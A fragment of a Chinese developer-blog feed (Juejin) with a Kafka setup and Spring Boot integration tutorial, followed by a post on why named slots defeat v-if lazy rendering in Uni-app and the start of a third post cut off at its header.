            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3210229685954718/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ihgry
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T13:46:39.000Z" title="Sun Dec 28 2025 13:46:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">概念</h4>
<ul>
<li>
<p>一个topic主题下面有多个分区（比如partition1、partition2、partition3），每个分区有多个副本；从所有的副本中选取一个作为Leader，其他作为Follower，Leader副本 负责消息的接收和消息的消费，Follower只负责数据的同步；当Leader分区故障后，从Follower中选取一个作为新的Leader</p>
</li>
<li>
<p>一个分区partition只能被消费者组中的一个消费者实例消费，当topic中分区数量发生变化 或者 消费者组中的消费者发生变化 会触发rebalance，重新分配分区partition和消费者实例 之间的关系</p>
</li>
<li>
<p>生产者发送的消息只在一个partition分区内有序，如果topic下面有多个分区，那所有消息整体是无序的</p>
</li>
<li>
<p>一个topic可以有多个消费者组，kafka会记录每个“消费者组” 消费到 “哪个分区的哪个偏移量offset”了</p>
</li>
</ul>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0682279ae6354bfc885ba4cef6a62202~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaWhncnk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767538899&amp;x-signature=yGQsogQMwY6Des3SmbIqi8LI%2Bh4%3D" alt="kafka.jpg" width="90%" loading="lazy"/></p>
<h4 data-id="heading-1">下载</h4>
<ul>
<li>
<p>下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fkafka.apache.org%2Fcommunity%2Fdownloads%2F%25EF%25BC%258C%25E8%25A7%25A3%25E5%258E%258B%25E5%258E%258B%25E7%25BC%25A9%25E5%258C%2585" target="_blank" title="https://kafka.apache.org/community/downloads/%EF%BC%8C%E8%A7%A3%E5%8E%8B%E5%8E%8B%E7%BC%A9%E5%8C%85" ref="nofollow noopener noreferrer">kafka.apache.org/community/d…</a></p>
</li>
<li>
<p>在<code>/root/kafka/kafka_2.12-3.6.2</code>目录下创建文件夹<code>mq_logs</code>，并在<code>mq_logs</code>文件夹下分别创建文件夹<code>kafka_data_logs</code>和<code>zookeeper_data</code>分别保存kafka的日志数据和zookeeper的数据</p>
</li>
<li>
<p>在<code>mq_logs</code>目录下创建<code>kafka_console.out</code>和<code>zookeeper_console.out</code>保存启动程序时的日志输出</p>
</li>
<li>
<p>进入config目录修改<code>zookeeper.properties</code>，将dataDir改为：<code>dataDir=/root/kafka/kafka_2.12-3.6.2/mq_logs/zookeeper_data</code></p>
</li>
<li>
<p>进入config目录修改<code>server.properties</code></p>
<ul>
<li>
<p>将log.dir改为<code>log.dirs=/root/kafka/kafka_2.12-3.6.2/mq_logs/kafka_data_logs</code></p>
</li>
<li>
<p>添加配置：<code>listeners=PLAINTEXT://0.0.0.0:9092</code>和<code> advertised.listeners=PLAINTEXT://localhost:9092</code></p>
</li>
</ul>
</li>
</ul>
<h4 data-id="heading-2">启动</h4>
<ul>
<li>
<p>先启动zookeeper：<code>nohup bin/zookeeper-server-start.sh config/zookeeper.properties &gt; /root/kafka/kafka_2.12-3.6.2/mq_logs/zookeeper_console.out 2&gt;&amp;1 &amp;</code></p>
</li>
<li>
<p>再启动kafka：<code>nohup bin/kafka-server-start.sh config/server.properties &gt; /root/kafka/kafka_2.12-3.6.2/mq_logs/kafka_console.out  2&gt;&amp;1 &amp;</code></p>
</li>
</ul>
<h4 data-id="heading-3">命令</h4>
<ul>
<li>
<p>创建主题：<code>./kafka-topics.sh --create --topic 主题名称 --bootstrap-server localhost:9092</code></p>
</li>
<li>
<p>查看所有主题：<code>./kafka-topics.sh --list --bootstrap-server localhost:9092</code></p>
</li>
<li>
<p>查看某个主题：<code>./kafka-topics.sh --describe --topic 主题名称 --bootstrap-server localhost:9092</code></p>
</li>
<li>
<p>删除某个主题：<code>./kafka-topics.sh --delete --topic 主题名称 --bootstrap-server localhost:9092</code></p>
</li>
<li>
<p>查看某个组的消费情况：<code>./kafka-consumer-groups.sh --describe --group 消费者组名称 --bootstrap-server localhost:9092</code></p>
</li>
<li>
<p>查看某个组下面的消费者：<code>./kafka-consumer-groups.sh --describe --group 消费组名称 --bootstrap-server localhost:9092 --members</code></p>
</li>
</ul>
<h4 data-id="heading-4">springboot整合kafka</h4>
<ul>
<li>
<p>引入依赖</p>
<pre><code class="hljs language-java" lang="java">&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.kafka&lt;/groupId&gt;
    &lt;artifactId&gt;spring-kafka&lt;/artifactId&gt;
&lt;/dependency&gt;
</code></pre>
</li>
<li>
<p>引入配置</p>
<pre><code class="hljs language-properties" lang="properties">spring.kafka.bootstrap-servers=115.190.156.159:9092
spring.kafka.producer.retries=3
spring.kafka.producer.batch-size=1000
spring.kafka.producer.buffer-memory=33554432

spring.kafka.consumer.group-id=crm-microservice-newperformance
spring.kafka.consumer.enable-auto-commit=false
spring.kafka.consumer.auto-offset-reset=earliest
spring.kafka.consumer.max-poll-records=200
spring.kafka.listener.ack-mode=MANUAL_IMMEDIATE
</code></pre>
</li>
<li>
<p>配置类：如果程序异常，spring默认将这条消息重复处理9次；这里配置的是同一消息 多次消费失败 的处理策略，即转发到另一个死信topic中；注意，这里是springboot2.7及以上版本的配置方式，和2.7以下版本配置方法不同</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KafkaConfig</span> {
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> CommonErrorHandler <span class="hljs-title function_">errorHandler</span><span class="hljs-params">(KafkaTemplate&lt;Object, Object&gt; template)</span> {
        <span class="hljs-comment">// 1. 定义死信恢复器,当重试耗尽后，将消息转发到 "原Topic.DLT"</span>
        <span class="hljs-type">DeadLetterPublishingRecoverer</span> <span class="hljs-variable">recover</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeadLetterPublishingRecoverer</span>(template);
        
        <span class="hljs-comment">// 2. 定义错误处理器</span>
        <span class="hljs-type">DefaultErrorHandler</span> <span class="hljs-variable">errorHandler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultErrorHandler</span>(recover, <span class="hljs-keyword">new</span> <span class="hljs-title class_">FixedBackOff</span>(<span class="hljs-number">1000L</span>, <span class="hljs-number">3</span>));

        <span class="hljs-keyword">return</span> errorHandler;
    }
}
</code></pre>
</li>
<li>
<p>生产者</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@CrossOrigin</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/kafka")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KafkaController</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> KafkaTemplate&lt;String, String&gt; kafkaTemplate;

    <span class="hljs-meta">@RequestMapping("/send")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">send</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException, ExecutionException {
        Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
        map.put(<span class="hljs-string">"userid"</span>, <span class="hljs-number">1001</span>);
        map.put(<span class="hljs-string">"name"</span>, <span class="hljs-string">"ccb"</span>+ UUID.randomUUID());

        ListenableFuture&lt;SendResult&lt;String, String&gt;&gt; result = kafkaTemplate.send(<span class="hljs-string">"test_ccb"</span>, JSONObject.toJSONString(map));
        System.out.println(<span class="hljs-string">"发送结果："</span>+result.get());
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ok"</span>;
    }
}
</code></pre>
</li>
<li>
<p>消费者</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KafkaConsumer</span> {

    <span class="hljs-comment">// 这里的concurrency=5代表会创建5个消费者实例</span>
    <span class="hljs-meta">@KafkaListener(topics = {"test_ccb"},concurrency = "5")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">consumer</span><span class="hljs-params">(ConsumerRecord&lt;?, ?&gt; consumerRecord, Acknowledgment ack)</span> {
        System.out.println(<span class="hljs-string">"收到消息："</span> + consumerRecord);
        ack.acknowledge();
    }
}
</code></pre>
</li>
</ul>
<h4 data-id="heading-5">Spring-Kafka原理</h4>
<ul>
<li><code>spring-kafka</code>的自动配置类中，通过<code>KafkaListenerAnnotationBeanPostProcessor </code>扫描每个Bean对象是否带有<code>@KafkaListener</code>注解，如果有则提取注解上的<code>topics</code>、<code>groupId</code>、<code>concurrency</code>等信息封装成一个Endpoint对象，根据Endpoint指定的容器工厂containerFactory创建容器，在容器内运行<code>KafkaConsumer</code></li>
<li>容器工厂是<code>ConcurrentKafkaListenerContainerFactory</code>，它生产容器<code>KafkaMessageListenerContainer</code>，在容器内运行<code>KafkaConsumer</code>，如果<code>concurrency</code>设置为3，将创建3个容器，也就是会有3个消费者实例</li>
<li>如果程序处理过程中出现了错误，会调用配置好的 <code>CommonErrorHandler</code>进行处理，默认会重试9次，如果还是失败，则提交该偏移量避免阻塞后续消息</li>
<li>gemini3剖析过程：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgemini.google.com%2Fshare%2F4de8006d21e2" target="_blank" title="https://gemini.google.com/share/4de8006d21e2" ref="nofollow noopener noreferrer">gemini.google.com/share/4de80…</a></li>
</ul>
<h4 data-id="heading-6">相关文章</h4>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Farticle%2F2185118" target="_blank" title="https://cloud.tencent.com/developer/article/2185118" ref="nofollow noopener noreferrer">3分钟带你彻底搞懂 Kafka-腾讯云开发者社区-腾讯云</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Farticle%2F2185123" target="_blank" title="https://cloud.tencent.com/developer/article/2185123" ref="nofollow noopener noreferrer">【真实生产案例】SpringBoot 整合 Kafka 实现数据高吞吐-腾讯云开发者社区-腾讯云</a></p>
</li>
<li>
<p>spring-kafka分析：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgemini.google.com%2Fshare%2F4de8006d21e2" target="_blank" title="https://gemini.google.com/share/4de8006d21e2" ref="nofollow noopener noreferrer">gemini.google.com/share/4de80…</a></p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Uni-app 性能天坑：为什么 v-if 删不掉 DOM 节点]]></title>    <link>https://juejin.cn/post/7589074117644288035</link>    <guid>https://juejin.cn/post/7589074117644288035</guid>    <pubDate>2025-12-29T09:22:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589074117644288035" data-draft-id="7589063105731723279" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Uni-app 性能天坑：为什么 v-if 删不掉 DOM 节点"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-29T09:22:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="heyCHEEMS"/> <meta itemprop="url" content="https://juejin.cn/user/4308367489378780"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Uni-app 性能天坑：为什么 v-if 删不掉 DOM 节点
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4308367489378780/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    heyCHEEMS
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:22:27.000Z" title="Mon Dec 29 2025 09:22:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在开发自定义 Swiper 或长列表组件时，为了优化性能，我们通常会给每一项加上懒加载逻辑：</p>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"item"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"shouldRender"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">:name</span>=<span class="hljs-string">"'slot-' + index"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
</code></pre>
<p><strong>神奇的事情发生了：</strong> 哪怕 <code>shouldRender</code> 是 <code>false</code>，打开小程序调试器一看，WXML 树里依然排满了 <code>view slot="slot-0"</code>、<code>view slot="slot-1"</code>... 里面甚至还塞满了图片节点。</p>
<p><strong>结论：你的 v-if 只是“隐藏”了视觉，内存和 DOM 压力一点没减。</strong></p>
<hr/>
<h3 data-id="heading-0">二、 具名插槽是“物理坑位”</h3>
<p>为什么 <code>v-if</code> 失效了？因为在微信小程序底层，<strong>具名插槽（Named Slots）</strong> 的实现逻辑是<strong>静态枚举</strong>。</p>
<ol>
<li><strong>预编译挖坑</strong>：小程序原生不支持动态插槽名。Uni-app 编译器为了兼容 Vue，会根据你的循环逻辑，在 WXML 里预先写死所有的占位符（如 <code>slot="d-0"</code>, <code>slot="d-1"</code>）。</li>
<li><strong>渲染权倒置</strong>：在具名插槽模式下，<strong>父组件拥有内容的实例化权</strong>。父组件会先把所有内容节点生成好，然后再“分发”给子组件。</li>
<li><strong>隔离失败</strong>：子组件里的 <code>v-if</code> 只能决定子组件自己是否显示，但挡不住父组件已经产生的物理节点。这就好比<strong>虽然你把家门关了（v-if=false），但邻居已经把货卸在了你门口（DOM 占位）</strong> 。</li>
</ol>
<hr/>
<h3 data-id="heading-1">三、 作用域插槽是“动态模版”</h3>
<p>要实现真正的懒加载（随 <code>v-if</code> 销毁 DOM），必须重构为<strong>作用域插槽（Scoped Slots）</strong> 。</p>
<h4 data-id="heading-2">1. 子组件改造：变“多坑”为“单模板”</h4>
<p>不要再给插槽起动态名字，统一使用带作用域的默认插槽或具名插槽。</p>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item, index) in list"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"index"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"shouldRender(index)"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"content"</span> <span class="hljs-attr">:item</span>=<span class="hljs-string">"item"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
</code></pre>
<h4 data-id="heading-3">2. 父组件调用 禁止 v-for 填充</h4>
<p>这是最关键的——<strong>父组件不再负责循环产生节点，只提供渲染模板。</strong></p>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-tag">&lt;<span class="hljs-name">Swiper</span> <span class="hljs-attr">:list</span>=<span class="hljs-string">"dataList"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-slot:content</span>=<span class="hljs-string">"{ item }"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">"item.url"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">Swiper</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-4">四、 为什么换成作用域插槽就生效了？</h3>
<p>这是底层架构的质变：</p>
<ul>
<li><strong>实例化时机改变</strong>：作用域插槽在小程序里被编译为 <code>template</code> 逻辑。<strong>实例化内容的控制权移交给了子组件</strong>。</li>
<li><strong>按需生成</strong>：只有子组件运行到 <code>v-if="true"</code> 且执行到 <code>&lt;slot /&gt;</code> 那一行代码时，父组件定义的“模板”才会动态转变为真正的 DOM。</li>
<li><strong>地基都没了</strong>：如果 <code>v-if="false"</code>，这段代码压根不会跑，父组件的内容在内存里连影子都不会出现。</li>
</ul>
<hr/>
<h3 data-id="heading-5">五、 避坑小结</h3>
<p>如果你在 Uni-app 开发者工具里发现 DOM 节点数不对劲，请检查以下两点：</p>
<ol>
<li><strong>是否在循环里用了动态具名插槽？</strong> （<code>:name="'xxx' + index"</code>）</li>
<li><strong>父组件是否也写了 <code>v-for</code> 去填坑？</strong></li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[三年前写的一个代码工具，至今已被 AI Coding 完全取代。]]></title>    <link>https://juejin.cn/post/7589074117644271651</link>    <guid>https://juejin.cn/post/7589074117644271651</guid>    <pubDate>2025-12-29T09:22:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589074117644271651" data-draft-id="7588971908226973730" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="三年前写的一个代码工具，至今已被 AI Coding 完全取代。"/> <meta itemprop="keywords" content="前端,AI编程"/> <meta itemprop="datePublished" content="2025-12-29T09:22:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="马致良"/> <meta itemprop="url" content="https://juejin.cn/user/3413334152193454"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" 